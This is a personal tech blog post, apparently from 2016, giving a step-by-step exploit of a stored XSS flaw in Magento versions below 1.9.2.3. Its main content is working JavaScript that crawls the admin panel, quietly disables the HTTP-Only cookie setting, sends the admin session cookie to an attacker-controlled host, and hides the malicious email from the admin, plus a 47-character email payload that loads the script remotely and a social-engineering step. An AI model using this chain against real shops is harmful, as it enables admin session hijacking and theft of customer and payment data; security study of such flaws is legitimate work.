
<!DOCTYPE HTML>
<html>
  <head>
    <title>Ethan's Tech Blog | Let&#39;s Exploit Magento! (&lt;1.9.2.3)</title>
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <meta name="description" content="Educational example of how to create an Exploit for Magento systems running versions less than 1.9.2.3!" />
    <meta name="author" content="Ethan Eldridge">
    <meta name="keywords" content="magento,xss,exploit,compromise,let&#39;s exploit,security"/>
    <meta name="robots" content="index, follow"  />
      <meta name="revisit-after" content="1 month" />
      <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">  
      
    
	<link rel="shortcut icon" href="//static.ethanjoachimeldridge.info/favicon.ico" type="image/x-icon" />
	<link rel="icon" href="//static.ethanjoachimeldridge.info/favicon.ico" type="image/ico">

        
    <!-- Facebook Open Graph Tags -->
    <meta property="og:title" content="Ethan Eldridge | Let&#39;s Exploit Magento! (&lt;1.9.2.3)" />
    <meta property="og:type" content="article" />
    <meta property="og:image" content="//static.ethanjoachimeldridge.info/ethan.jpeg" />
    <meta property="og:url" content="http://www.ethanjoachimeldridge.info/" />
    
    <meta property="og:description" content="Educational example of how to create an Exploit for Magento systems running versions less than 1.9.2.3!" />
    

    <!-- Twitter Card Tags -->
    <meta name="twitter:card" content="summary" />
    <meta name="twitter:title" content="Ethan Eldridge | Let&#39;s Exploit Magento! (&lt;1.9.2.3)" />
    
    <meta name="twitter:description" content="Educational example of how to create an Exploit for Magento systems running versions less than 1.9.2.3!" />
    
    <meta name="twitter:image" content="//static.ethanjoachimeldridge.info/ethan.jpeg" />
    	<!-- Core CSS Scripts -->
	<link href='https://fonts.googleapis.com/css?family=EB+Garamond' rel='stylesheet' type='text/css'>
	<link rel='stylesheet' href='//css.ethanjoachimeldridge.info/style.css' />


	
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-52103053-1', 'www.ethanjoachimeldridge.info');
  ga('require', 'linkid', 'linkid.js');
  ga('send', 'pageview');

</script>

  </head>
  <body>
    <header>
      <h1>Let&#39;s Exploit Magento! (&lt;1.9.2.3)</h1>
    </header>


    <div id="content">
      <a href="/tech-blog">Back</a>
      <h4>Why?</h4><p>A <a href="http://www.seancperkins.com">friend of mine</a> sent me an <a href="https://blog.sucuri.net/2016/01/security-advisory-stored-xss-in-magento.html">interesting advisory</a> the other day, 
demonstrating that there was an XSS exploit for the eCommerce platform 
Magento. I like security advisories, mainly because it&#39;s an interesting 
challenge and a good way to learn more about the underlying frameworks 
you&#39;re using. Since it was a lot of fun to <a href="/tech-blog/compromising-wordpress">exploit wordpress</a>, I 
figure&#39;d I&#39;d try out this XSS exploit. It should go without saying, but 
don&#39;t try this on systems that aren&#39;t yours, or you&#39;ll be violating the 
<a href="http://www.leginfo.ca.gov/cgi-bin/displaycode?section=pen&amp;group=00001-01000&amp;file=484-502.9">law</a>. </p>
<h4>The plan</h4><p>As pointed out in the <a href="https://blog.sucuri.net/2016/01/security-advisory-stored-xss-in-magento.html">interesting advisory</a>, this is a flaw that has to 
be triggered by an administrator checking on an order. So in our pretend 
scenario we have two types of exploits going on:</p>
<ol>
<li>Taking advantage of the vulnerability itself </li>
<li>Convincing the admin to check your order</li>
</ol>
<p>Both of these are likely to be fairly easy given the nature of Magento. 
Calling or emailing an adminstrator in reference to your order would get 
any well-intentioned admin to check it out. And the first is trivially 
done according to the advisery by using the quoted form of an email 
address for your client account. So our attack plan is simple: </p>
<ol>
<li>Setup our server to receive information</li>
<li>Perform exploit and call up our friendly admin</li>
<li>Steal their credentials or perform actions under their name</li>
</ol>
<h4>Setup</h4><p>First off, we need to download a version of magento that isn&#39;t patched, 
so we can grab any copy of magento that is less than 1.9.2.3 from the 
<a href="https://www.magentocommerce.com/download">downloads page</a>. I had to create an account to download the software, 
so do that if you need to (use <a href="https://www.guerrillamail.com/">guerrillamail</a> if you need a quick 
email address to use). Then <a href="https://www.siteground.com/tutorials/magento/magento_installation.htm">setup magento</a>. In my case I&#39;ll be using 
<a href="https://www.apache.org/">apache</a> with the following host setup:</p>
<pre><code># My New Magento Install! Nothing bad could happen :D 
&lt;VirtualHost *:80&gt;
    Servername local.magento.sec
    ErrorLog /tmp/error.log
    DocumentRoot /path/to/magento
    &lt;Directory /path/to/magento &gt;
        Options Indexes FollowSymLinks MultiViews
        AllowOverride All
        Order allow,deny
        allow from all
    &lt;/Directory&gt;
&lt;/VirtualHost&gt;

#My Evil domain that will exploit the poor thing:
&lt;VirtualHost *:80&gt;
    Servername local.evil.sec
    CustomLog /tmp/exploit.log combined
    DocumentRoot /tmp
    &lt;Directory /tmp &gt;
        Order allow,deny
        allow from all
    &lt;/Directory&gt;
&lt;/VirtualHost&gt;
</code></pre><p>And then setup your hosts file appropriately:</p>
<pre><code>127.0.0.1 local.magento.sec local.evil.sec
</code></pre><p>And starting up apache and navigating to your local site should give you 
the installation screen and you can follow the instructions to <a href="https://www.siteground.com/tutorials/magento/magento_installation.htm">setup magento</a>.
In my case, I had to update some permissions and install the php5-gd 
package on my system before being able to run magento. Your mileage may 
vary. Also, installing magento is <em>slow</em>, the database has over 300 
tables in the base install, be patient as you install it. </p>
<p>Once you&#39;re setup, you should be able to log in to your admin panel and 
see that magento wants to update:</p>
<p><img style="max-width: 100%" src="/images/tech-blog/magento-sec.jpg"></p>
<p>Ignoring that, <a href="https://www.siteground.com/tutorials/magento/magento_product.htm">create a product</a> or two and verify that your site is 
working properly. </p>
<h4>Confirming the exploit</h4><p>Before we do anything complicated, we want to perform a smoke test to 
make sure that we can trigger the problem ourselves. We&#39;ll do the same 
test that the advisory did and simple alert on the page by using the 
email <code>&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&quot;@sucuri.net</code>. When you do this 
from the checkout page you&#39;ll get an error saying you it&#39;s not a valid 
email. However, this is only a front end check that we can trivially 
avoid by editing the HTML and removing the attributes the JS relys on 
to validate:</p>
<p><img style="max-width: 100%" src="/images/tech-blog/magento-client-side-validation.jpg"></p>
<p>Click through the rest of the steps and place your order.</p>
<p><img style="max-width: 100%" src="/images/tech-blog/magento-order.jpg"></p>
<p>Then in the admin panel navigate to sales and your orders and verify 
that the exploit happens:</p>
<p><img style="max-width: 100%" src="/images/tech-blog/magento-success.jpg"></p>
<p>You&#39;ll see the pop-up twice before the page fully loads. Now the real 
question is <em>what can we do?</em>.</p>
<h4>Getting dirty</h4><p>The first thing that comes to my mind is to attempt to steal the session 
of the admin user. But a quick look at the cookies of the page will tell 
us that such a thing won&#39;t work since the cookies are HTTP-Only:</p>
<p><img style="max-width: 100%" src="/images/tech-blog/magento-cookies.jpg"></p>
<p>So that&#39;s seems like a dead end at first, but we can actually change 
the settings for these cookies from magento! The HTTP-Only setting is 
configured from the Web section of the System configuration page, and 
by default is turned on:</p>
<p><img style="max-width: 100%" src="/images/tech-blog/magento-config.jpg"></p>
<p>So the question becomes, how can we get to this page using our exploit?
First off, we&#39;ll note that the navigation bar has an id of <code>nav</code>. So 
that&#39;s trivial to get via javascript:</p>
<pre><code>var nav = document.getElementById(&#39;nav&#39;)
</code></pre><p>And once we do that it&#39;s simple to note that the navigation consists of 
links like the following:</p>
<pre><code>&lt;li class=&quot;  last level1&quot;&gt;
    &lt;a href=&quot;http://local.magento.sec/index.php/admin/system_config/index/key/d1b178d00a7755670c57af7f3f59bfa3/&quot; class=&quot;&quot;&gt;&lt;span&gt;Configuration&lt;/span&gt;&lt;/a&gt;
&lt;/li&gt;
</code></pre><p>We can&#39;t get much from the link itself, but the internal <code>span</code> tells us 
everything we need to know. Leveraging this:</p>
<pre><code>var spans = nav.getElementsByTagName(&#39;span&#39;)
for(i in spans) { 
    if (spans[i].hasOwnProperty(&#39;textContent&#39;) &amp;&amp; spans[i].textContent == &quot;Configuration&quot;) { 
        configLink = spans[i].parentElement.href
    } 
}
</code></pre><p>And now we have the correct link to follow stored in <code>configLink</code>. Since 
magento uses <a href="http://prototype.conio.net/">prototype</a> we can perform AJAX requests for pages pretty 
easily:</p>
<pre><code>var configPage = document.createElement(&#39;span&#39;)
configPage.display = &#39;None&#39;;
new Ajax.Updater(configPage, configLink, {method: &#39;get&#39;})
</code></pre><p>This will call up the system page which has another link we need. The 
HTTP Only settings are in the Web settings, so we&#39;ll find that link in 
the new page and then proceed from there:     </p>
<pre><code>var spans = configPage.getElementsByTagName(&#39;span&#39;)
for( var i = 0; i &lt; spans.length; i++) {
    if (spans[i].hasOwnProperty(&#39;textContent&#39;) &amp;&amp; spans[i].textContent.indexOf(&quot;Web&quot;)!=-1) { 
        webConfigLink = spans[i].parentElement.href
    } 
}
var webPage = document.createElement(&#39;span&#39;)
webPage.display = &#39;None&#39;
new Ajax.Updater(webPage, webConfigLink, {method: &#39;get&#39;})
</code></pre><p>Once we have this page we&#39;re nearly there. We just need to select the 
correct option for HTTP cookies and then submit the form. This is easy 
enough to do programmatically since the option has an id:</p>
<pre><code>//Get the select menu:
var select = webPage.getElementsBySelector(&#39;[id=web_cookie_cookie_httponly]&#39;)[0]

//Set the options to No
for(var o = 0; o &lt; select.options.length; o++) {
    select.options[o].value = 0 //set it to the &#39;No&#39; value easily
}

//Grab that form
var form = webPage.getElementsByTagName(&#39;form&#39;)[0]
//Submit it via Ajax using prototype so the admin doesn&#39;t know
$(form).request({
    onFailure: function(){}, 
    onSuccess: function(t){
        //wait for it...
    }
})
</code></pre><p>Now that we&#39;ve done that the HTTP-Only flag on the cookies is gone, 
which means that we can steal the admin&#39;s session. </p>
<p><img style="max-width: 100%" title="No exploit is complete without a smug anime face" src="/images/tech-blog/magento-smug-cookie.jpg"></p>
<p>To send the session to the hacker we&#39;ll use our second virtual host and 
the oldest trick in the book, the access log! Updating the <code>wait for it</code> 
part of our form handler code gives us the final step to our hijack:</p>
<pre><code>onSuccess: function(t){
    var logPage = document.createElement(&#39;span&#39;)
    var evil = &#39;http://local.evil.sec?&#39; + document.cookie
    logPage.display = &#39;None&#39;
    new Ajax.Updater(logPage, evil, {method: &#39;get&#39;})    
}
</code></pre><p>Once you do this, you&#39;ll see the admin cookie appear in the log file of 
the hackers domain:</p>
<p><img style="max-width: 100%" src="/images/tech-blog/magento-log.jpg"></p>
<p>Once we&#39;ve got this, we just do a simple cookie setting and we&#39;re good 
to run wild. First go to the admin page and open up your console. Then 
set the document to be the value sent in your request:</p>
<p><img style="max-width: 100%" src="/images/tech-blog/magento-breaking-in.jpg"></p>
<p>Refresh the page and you&#39;ll have access to the admin console:</p>
<p><img style="max-width: 100%" src="/images/tech-blog/magento-in.jpg"></p>
<h4>Putting it all together</h4><p>It&#39;s easy to write all the above into the console to verify that it 
works, but it&#39;s another thing to actually use the email exploit to run 
the code. We have two options:</p>
<ol>
<li>Insert all that code into the email address</li>
<li>Have the email address inject a script to handle things for us</li>
</ol>
<p>Either way we need to wrap the code into a single package so let&#39;s do 
that:</p>
<pre><code>/** Helpers */
function findLinkInSpan(spans, search) {
    for(i in spans) { 
        if (spans[i].hasOwnProperty(&#39;textContent&#39;) &amp;&amp; spans[i].textContent.trim() == search.trim()) {
            return spans[i].parentElement.href;
        } 
    }
}

/** Wait for the AJAX to stick the data into our target element */
var waitingTime = 3000;

function exploitOrderPage() {
    /** Navigate the menu */
    var nav = document.getElementById(&#39;nav&#39;);
    var spans = nav.getElementsByTagName(&#39;span&#39;);
    configLink = findLinkInSpan(spans, &quot;Configuration&quot;);

    /** Global for exploitConfigPage to use */
    configPage = document.createElement(&#39;span&#39;);
    configPage.display = &#39;None&#39;;
    new Ajax.Updater(configPage, configLink, {
            method: &#39;get&#39;, 
            onSuccess: function(){
                setTimeout(function(){
                    exploitConfigPage()
                }, waitingTime); 
            }
        }
    );
}

function exploitConfigPage() {
    var spans = configPage.getElementsByTagName(&#39;span&#39;);
    var webConfigLink = findLinkInSpan(spans, &#39;Web&#39;);

    /** Global for exploitWebPage to use */
    webPage = document.createElement(&#39;span&#39;);
    webPage.display = &#39;None&#39;;
    new Ajax.Updater(webPage, webConfigLink, {
            method: &#39;get&#39;, 
            onSuccess: function(){
                setTimeout(function(){
                    exploitWebPage();
                },waitingTime);
            }
        }
    );
}

function exploitWebPage() {
    var select = webPage.getElementsBySelector(&#39;[id=web_cookie_cookie_httponly]&#39;)[0];
    for(var o = 0; o &lt; select.options.length; o++) {
        select.options[o].value = 0; //set it to the &#39;No&#39; value easily
    }
    var form = webPage.getElementsByTagName(&#39;form&#39;)[0]
    //Submit it via Ajax using prototype so the admin doesn&#39;t know
    $(form).request({
        onFailure: function(){}, 
        onSuccess: function(t){
            var logPage = document.createElement(&#39;span&#39;);
            var evil = &#39;http://local.evil.sec?&#39; + document.cookie;
            logPage.display = &#39;None&#39;;
            new Ajax.Updater(logPage, evil, {method: &#39;get&#39;});
        }
    })
}

/** On load we want to hide the weird email from the admin and steal! */
var anchors = document.getElementsByTagName(&#39;a&#39;)
for(var i = 0; i &lt; anchors.length; i++) {
    if(anchors[i] &amp;&amp; anchors[i].href == &#39;mailto:&#39;) {
        anchors[i].textContent = &#39;user@example.com&#39;;
    }
}
//GO!
exploitOrderPage();
</code></pre><p>The code is a little rough because we have a series of callbacks that 
fire as the pages are loaded into the target divs by prototype. In my 
testing it seemed like there was enough delay between when the request 
completed and when variables like <code>configPage</code> were filled with data 
that a timeout was the only way to ensure that there was data available 
to iterate over with <code>.getElementsByTagName</code>.</p>
<p>Note that even though we don&#39;t have any CORS headers on our evil domain, 
we don&#39;t actually need them to get the credentials in our log file since 
the preflight request will show up in the log. If you were a real 
attacker trying to be silent, you&#39;d likely adjust your server 
accordingly.</p>
<p>So let&#39;s try the first tactic, putting all of the code into an email 
address in the checkout form:</p>
<p><img style="max-width: 100%" src="/images/tech-blog/magento-exploit-checkout.jpg"></p>
<p>And editing the HTML with the inspector to remove the validation from 
the element results in</p>
<p><img style="max-width: 100%" src="/images/tech-blog/magento-length-error.jpg"></p>
<p>And checking out the magento source it looks like the length calculation 
is pretty small:</p>
<pre><code>//lib/Zend/Validate/EmailAddress.php
 if ((strlen($this-&gt;_localPart) &gt; 64) || (strlen($this-&gt;_hostname) &gt; 255)) {
    $length = false;
    $this-&gt;_error(self::LENGTH_EXCEEDED);
}
</code></pre><p>So it seems like the first attempt is out since the full script can&#39;t be 
fit into 64 characters. So instead let&#39;s try to load it from our evil 
domain! We can do this by saving our script to <code>a.js</code> and loading it via 
a <code>script</code> tag with the malicious email:</p>
<pre><code>&quot;&lt;script src=&#39;//local.evil.sec/a.js&#39;&gt;&lt;/script&gt;&quot;@exploited.net
</code></pre><p>This comes in at 47 characters, so if you&#39;re testing with a longer local 
domain name then a link shortener would be a good idea. Or if you don&#39;t 
mind whiting out most of the screen you can drop seven characters by 
removing the closing <code>&lt;script&gt;</code> tag (though that makes the attack more 
obvious).</p>
<p><img style="max-width: 100%" src="/images/tech-blog/magento-email-attack.jpg"></p>
<p>Submit your order after filling out the rest of the fields:</p>
<p><img style="max-width: 100%" src="/images/tech-blog/magento-evil-order.jpg"></p>
<p>Navigating from our admin window to the new order, we&#39;ll be greeted with 
our usual screen, but if we open up the console in a few seconds we&#39;ll 
start to see the effects of the attack:</p>
<p><img style="max-width: 100%" src="/images/tech-blog/magento-exploited-1.jpg"></p>
<p>And in our log files:</p>
<p><img style="max-width: 100%" src="/images/tech-blog/magento-exploited-log.jpg"></p>
<p>Using this value we can then update our cookie from our hackers 
perspective:</p>
<p><img style="max-width: 100%" src="/images/tech-blog/magento-cookie.jpg"></p>
<p>Then simply click in the url and navigate to /admin and you&#39;ve 
successfully broken into a magento site using an exploit and session 
hijacking!</p>
<p><img style="max-width: 100%" src="/images/tech-blog/magento-im-in.jpg"></p>
<h4>So what now?</h4><p>Now you go and you <a href="https://www.magentocommerce.com/download">update magento</a> so that you don&#39;t run into someone 
pulling this trick on you! The last thing you need is a random user 
getting access to customer information, saved credit cards, or anything 
like that! Just browsing through the configuration screen&#39;s it&#39;s easy to 
see multiple attack vectors that one could use to install back-doors to 
the system so that even after they upgrade, the attack can still get in.</p>
<p>Security is important, and I&#39;ve written this post so that if anyone is
using an old version of magento in production they can go to their boss, 
demonstrate the attack here, and get their blessing to spend as much 
time as neccesary in patching their system. It&#39;s not always fun to 
upgrade when we could be developing, but doing so keeps the entire 
internet healthy (you don&#39;t want your servers or clients helping out 
with a DDoS do you?). So get out there and patch!</p>
<h4>Obvious Disclaimer</h4><p>In case it&#39;s not obvious This is example code meant for <em>educational 
purposes only</em>. Do <em>not</em> run this on any machine you do not own! It is a 
violation of both <a href="http://www.ncsl.org/research/telecommunications-and-information-technology/computer-hacking-and-unauthorized-access-laws.aspx">state and federal law</a> that often carries a hefty 
fine. Just <strong>don&#39;t</strong> do it.</p>
      
      <h3>Other Posts</h3>
      <div id="other-posts">
        <ul>
          <li><a href=docker-playframework-tip>Dockerized Play! App continously restarts?</a></li><li><a href=implementing-subresource-integrity-sri>How to implement Subresource Integrity (SRI)</a></li><li><a href=appending-javascript-files-in-play-for-configuration>Combining Asset&#39;s on the fly in Play (javascript example)</a></li><li><a href=how-to-test-playframework-mailer>How to test the PlayFramework Mailer</a></li><li><a href=partial-file-uploads-play>Partial file uploads in Play with ResumableJS</a></li><li><a href=upload-binary-data-play-exif>Upload binary data in play</a></li>
        </ul>
      </div>
      <div id="disqus_thread"></div>
    <script type="text/javascript">
        var disqus_shortname = 'ejehardenberg';
        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink"><!--
    -->comments powered by <span class="logo-disqus">Disqus</span>
</a>   
    </div>
    <nav>
	<ul>
		
			<li>
				<a href="/index">
					<span>Home</span>
				</a>
			</li>
		
			<li>
				<a href="/about">
					<span>About me</span>
				</a>
			</li>
		
			<li>
				<a href="/projects">
					<span>Projects</span>
				</a>
			</li>
		
			<li>
				<a href="/resume">
					<span>Resume</span>
				</a>
			</li>
		
			<li>
				<a href="/tech-blog">
					<span>Tech Blog</span>
				</a>
			</li>
		
			<li>
				<a href="/cooking">
					<span>Cooking</span>
				</a>
			</li>
		
			<li>
				<a href="/writing">
					<span>Writing</span>
				</a>
			</li>
		
			<li>
				<a href="/contact">
					<span>Contact</span>
				</a>
			</li>
		
		<li>
			<a href="/writing/political">
				<span>Opinion</span>
			</a>
		</li>
		<li>
			<a href="https://github.com/EdgeCaseBerg">
				<span>Github</span>
			</a>
		</li>
		<li> 
			<a href="https://twitter.com/TheR3dLily">
				<span>Twitter</span>
			</a>
		</li>
		<li>
			<a href="http://www.linkedin.com/profile/view?id=151414806">
				<span>LinkedIn</span>
			</a>
		</li>
	</ul>
</nav>

  </body>
</html>
  	